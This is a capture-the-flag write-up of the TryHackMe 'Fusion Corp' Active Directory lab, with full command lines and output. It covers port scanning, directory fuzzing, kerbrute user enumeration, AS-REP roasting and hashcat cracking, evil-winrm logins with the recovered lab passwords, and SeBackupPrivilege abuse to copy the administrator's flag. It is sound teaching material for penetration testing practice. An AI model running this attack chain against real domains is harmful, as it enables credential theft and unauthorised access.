---
title: TryHackMe Fusion Corp
date: 2024-10-22
tags: [tryhackme, ctf]
author: nandakishor
---
![alt text](../assets/images/fusion-corp/c7c5cbaebf5b3c858e7c37f4213ab6e1.jpeg)
A backup file containing all user information was discovered on the web server. One user from the backup, lparker, had pre-authentication disabled, allowing the hash to be cracked and a shell accessed as that user. Once inside, it was found that another user, jmurphy, had their password stored in the user description field. As a member of the backup operator group, this privilege was abused to read the root flag and complete the challenge.

##Recon

```
┌──(kali㉿kali)-[~/tmp]
└─$ rustscan -a 10.10.26.188        
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.26.188:53
Open 10.10.26.188:88
Open 10.10.26.188:80
Open 10.10.26.188:139
Open 10.10.26.188:135
Open 10.10.26.188:389
Open 10.10.26.188:464
Open 10.10.26.188:445
Open 10.10.26.188:593
Open 10.10.26.188:636
Open 10.10.26.188:3269
Open 10.10.26.188:3268
Open 10.10.26.188:3389
Open 10.10.26.188:9389
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 
PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack
80/tcp   open  http             syn-ack
88/tcp   open  kerberos-sec     syn-ack
135/tcp  open  msrpc            syn-ack
139/tcp  open  netbios-ssn      syn-ack
389/tcp  open  ldap             syn-ack
445/tcp  open  microsoft-ds     syn-ack
464/tcp  open  kpasswd5         syn-ack
593/tcp  open  http-rpc-epmap   syn-ack
636/tcp  open  ldapssl          syn-ack
3268/tcp open  globalcatLDAP    syn-ack
3269/tcp open  globalcatLDAPssl syn-ack
3389/tcp open  ms-wbt-server    syn-ack
9389/tcp open  adws             syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: eBusiness Bootstrap Template
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-24 15:21:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-24T15:22:06+00:00
|_ssl-date: 2024-10-24T15:22:46+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2024-10-23T15:15:25
|_Not valid after:  2025-04-24T15:15:25
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2024-10-24T15:22:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.85 seconds
```
Add the domain names to host file


##Web enumeration
![
](<../assets/images/fusion-corp/Screenshot 2024-10-24 205313.png>)

we can see some usernames here, we know it is a windows AD machines so the usernames are important note it,
```
Jhon Mickel
Andrew Arnold
Lellien Linda
Jhon Powel
```
```
┌──(kali㉿kali)-[~/tmp]
└─$ ffuf -u http://10.10.26.188/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.26.188/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

backup                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 3673ms]
contactform             [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 982ms]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 1275ms]
```
i found a backup directory
![alt text](<../assets/images/fusion-corp/Screenshot 2024-10-24 205756.png>)

![alt text](<../assets/images/fusion-corp/Screenshot 2024-10-24 211619.png>)

save this usernames, and check the usernames are valid in the domian or not
```
jmickel
aarnold
llinda
jpowel
dvroslav
tjefferson
nmaurin
mladovic
lparker
kgarland
dpertersen
```
```
┌──(kali㉿kali)-[~/tmp]
└─$ kerbrute userenum --dc fusion.corp -d fusion.corp usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/25/24 - Ronnie Flathers @ropnop

2024/10/25 09:38:46 >  Using KDC(s):
2024/10/25 09:38:46 >  	fusion.corp:88

2024/10/25 09:38:47 >  [+] VALID USERNAME:	 lparker@fusion.corp
2024/10/25 09:38:52 >  Done! Tested 11 usernames (1 valid) in 5.583 seconds
```
we found a username

###Checking if our user has pre auth disabled

```
┌──(kali㉿kali)-[~/tmp]
└─$ impacket-GetNPUsers fusion.corp/ -no-pass -usersfile validuser.txt -request       
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

$krb5asrep$23$lparker@fusion.corp@FUSION.CORP:01127920fbe8ed7ad6d61ef147d93f51$0492ff67306f51988b15adac051c84a597f259c402774d804451a15f6799ed04d3bc36bf862312a5b14c871362e829c94482f0439251ad68d2a37493211dabde6509ec0d3d629678ed0ce41783c6d61bac700f5a4e1394419bd05d033e42ca93d19ed0a0307de6602507469dbd16ad574cf1415992e816184e51f328c5a30077fc6082e481cfd53e922d7ad77e7fee6c87367a5bccf0c076c710e7e1587458d95de238b4f73062371d61071aefc022718beb95588f0eba6278dab3d240b44b738b0c6658d09a135e953c298a2f2af89f88efaa1368191b5eecb57fe399726e30a8695596715f90739439
```
Crack this hash
```
┌──(kali㉿kali)-[~/tmp]
└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --show
$krb5asrep$23$lparker@fusion.corp@FUSION.CORP:01127920fbe8ed7ad6d61ef147d93f51$0492ff67306f51988b15adac051c84a597f259c402774d804451a15f6799ed04d3bc36bf862312a5b14c871362e829c94482f0439251ad68d2a37493211dabde6509ec0d3d629678ed0ce41783c6d61bac700f5a4e1394419bd05d033e42ca93d19ed0a0307de6602507469dbd16ad574cf1415992e816184e51f328c5a30077fc6082e481cfd53e922d7ad77e7fee6c87367a5bccf0c076c710e7e1587458d95de238b4f73062371d61071aefc022718beb95588f0eba6278dab3d240b44b738b0c6658d09a135e953c298a2f2af89f88efaa1368191b5eecb57fe399726e30a8695596715f90739439:!!abbylvzsvs2k6!
```

password: `!!abbylvzsvs2k6!`

User winrm to get the shell

```
──(kali㉿kali)-[~/tmp]
└─$ evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\lparker\Documents>
```
Get the first flag

```
cat *Evil-WinRM* PS C:\Users\lparker\Desktcat flag.txt
THM{c105b6fb24974FAKEf}
*Evil-WinRM* PS C:\Users\lparker\Desktop> 
```

###Enumerate using ldapsump

```
┌──(kali㉿kali)-[~/tmp]
└─$ ldapdomaindump fusion.corp -u 'fusion.corp\lparker' -p '!!abbylvzsvs2k6!' --no-json --no-grep
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ la                                                                                           
domain_computers.html        domain_policy.html  domain_users_by_group.html  usernames.txt
domain_computers_by_os.html  domain_trusts.html  employees.ods               validuser.txt
domain_groups.html           domain_users.html   hash
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ open domain_users.html
```
![alt text](<../assets/images/fusion-corp/Screenshot 2024-10-25 101328.png>)
we can see another username and password

`jmurphy: u8WC3!kLsgw=#bRY`

Login as this user

`evil-winrm -i fusion.corp -u jmurphy -p 'u8WC3!kLsgw=#bRY'`

```
└─$ evil-winrm -i fusion.corp -u jmurphy -p 'u8WC3!kLsgw=#bRY'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jmurphy\Documents>
```
`THM{b4aee2db2901514e28db4****047612e}`

##ROOT Flag

```
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> 
```

https://github.com/giuliano108/SeBackupPrivilege

use this to exploit

```
┌──(kali㉿kali)-[~/…/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug]
└─$ ls
SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dl

```
upload this file to the machine to read the root flag

```
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> upload SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /home/kali/tmp/SeBackupPrivilegeCmdLets.dll to C:\Users\jmurphy\Desktop\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> upload SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /home/kali/tmp/SeBackupPrivilegeUtils.dll to C:\Users\jmurphy\Desktop\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
Use this
![alt text](<../assets/images/fusion-corp/Screenshot 2024-10-25 115838.png>)

```
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> Copy-FileSeBackupPrivilege C:\users\administrator\Desktop\flag.txt root.txt 
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> ls


    Directory: C:\Users\jmurphy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt
-a----       10/24/2024  11:30 PM             37 root.txt
-a----       10/24/2024  11:26 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----       10/24/2024  11:27 PM          16384 SeBackupPrivilegeUtils.dll


*Evil-WinRM* PS C:\Users\jmurphy\Desktop> cat root.txt
THM{f72988e57bfc***1deeebf***2115e10464d15}
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> 
```